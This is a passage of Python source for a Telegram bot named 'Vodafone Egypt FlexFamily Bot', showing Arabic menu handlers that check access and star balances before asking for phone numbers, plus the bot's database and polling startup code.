            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        if svc_access == "no_stars":
            safe_send(uid, "⛔ ليس لديك نجوم كافية. تواصل مع المشرف.")
            return
        set_user_state(uid, "step", "fly_owner")
        safe_send(uid, "👤 ابعت رقم المالك:", parse_mode="Markdown")
        return

    # ── Multi-step flow ────────────────────────────────────────
    if text == "🔗 عملية متعددة":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "🔗 عملية متعددة")
        if svc_access == "star_blocked":
            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        if svc_access == "no_stars":
            safe_send(uid, "⛔ ليس لديك نجوم كافية. تواصل مع المشرف.")
            return
        set_user_state(uid, "step", "multi_o1")
        safe_send(uid, "👤 Owner1 — ابعت الرقم:", parse_mode="Markdown")
        return

    # ── Eligibility check ────────────────────────────────────
    if text == "🔍 فحص التأهيل":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "🔍 فحص التأهيل")
        if svc_access == "star_blocked":
            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        set_user_state(uid, "step", "elig_number")
        safe_send(uid, "📱 ابعت رقم الخط:", parse_mode="Markdown")
        return

    # ── Nota all bundles ───────────────────────────────────────
    if text == "📦 نوتة كل الأنظمة":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "📦 نوتة كل الأنظمة")
        if svc_access == "star_blocked":
            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        set_user_state(uid, "step", "nota_number")
        safe_send(uid, "📱 ابعت رقم الخط:", parse_mode="Markdown")
        return

    # ── Nota 15 ───────────────────────────────────────────────
    if text == "⚡ نوتة فليكس 15":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "⚡ نوتة فليكس 15")
        if svc_access == "star_blocked":
            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        set_user_state(uid, "step", "nota15_number")
        safe_send(uid, "📱 ابعت رقم الخط:", parse_mode="Markdown")
        return

    # ── Day rollover ─────────────────────────────────────────
    if text == "📅 تزويد أيام":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "📅 تزويد أيام")
        if svc_access == "star_blocked":
            safe_send(uid, "⛔ هذه الخدمة غير متاحة لحساب النجوم.")
            return
        set_user_state(uid, "step", "roll_number")
        safe_send(uid, "📱 ابعت رقم الخط:", parse_mode="Markdown")
        return

    # ── Catch /start and unknown commands ─────────────────────
    if text.startswith("/"):
        return

    # ── If user is in some step state, remind them ───────────
    if step:
        safe_send(uid, "⚠️ أنت في منتص عملية. اضغط /start لإلغائها والبدء من جديد.")
        return

# ════════════════════════════════════════════════════════════════
# 🚀 Startup
# ════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("🚀 Vodafone Egypt FlexFamily Bot — Starting...")
    print("=" * 60)

    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN not set in environment variables")
        raise SystemExit(1)

    _init_pool()
    _init_db()

    print(f"✅ Bot initialized | Admin: {DEFAULT_ADMIN_ID}")
    print(f"✅ DB Pool: min=2, max=20")
    print(f"✅ Threads: 50 (num_threads)")
    print("=" * 60)

    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=50)
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user.")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        traceback.print_exc()
    finally:
        if _db_pool:
            _db_pool.closeall()
        print("🧹 Cleanup complete. Goodbye!")
